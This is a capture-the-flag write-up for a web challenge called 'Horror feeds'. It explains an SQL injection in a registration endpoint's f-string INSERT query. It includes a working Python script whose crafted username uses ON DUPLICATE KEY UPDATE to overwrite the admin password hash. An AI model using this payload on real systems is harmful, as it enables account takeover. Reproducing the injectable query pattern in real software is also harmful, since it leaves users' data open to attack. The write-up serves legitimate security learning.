# [Web] Horror feeds

This web application contains a dashboard, that will display the flag if the logged in user has `admin` as username.
In order to register new users, this application takes a JSON input containing the username and password of the new user.

However the query responsible to INSERT is vulnerable to a SQLi

```python
def register(username, password):
    exists = query_db('SELECT * FROM users WHERE username = %s', (username,))
    if exists:
        return False
    hashed = generate_password_hash(password)
    query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")')
    mysql.connection.commit()

    return True
```

We can exploit it by using a new username to pass the existence check, but concatenate another value for the insert in the password. The only hurdle is that the username has a `UNIQUE` constraint

```sql
CREATE TABLE horror_feeds.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);
```

To bypass this constraint, we can tell MySQL how to react in case of conflict with [ON DUPLICATE KEY UPDATE](https://dev.mysql.com/doc/refman/8.0/en/insert-on-duplicate.html)

Our final payload is

```python
import requests

host = "1.2.3.4"
port = "31104"

def main():
    payload = {
        # password = bbb
        'username': 'test","$2b$12$gOWv7k1i8FRE07xUZE79ueTxXZHA42U5OtYqlmg6yWcyEYF5W9zIa"),("admin","$2b$12$gOWv7k1i8FRE07xUZE79ueTxXZHA42U5OtYqlmg6yWcyEYF5W9zIa") ON DUPLICATE KEY UPDATE password="$2b$12$gOWv7k1i8FRE07xUZE79ueTxXZHA42U5OtYqlmg6yWcyEYF5W9zIa" -- -',
        'password': 'whatever'
        }
    response = requests.post("http://" + host + ":" + port + "/api/register", json = payload)
    print(response)
main()
```

We can then login with the user `admin` and the password `bbb`
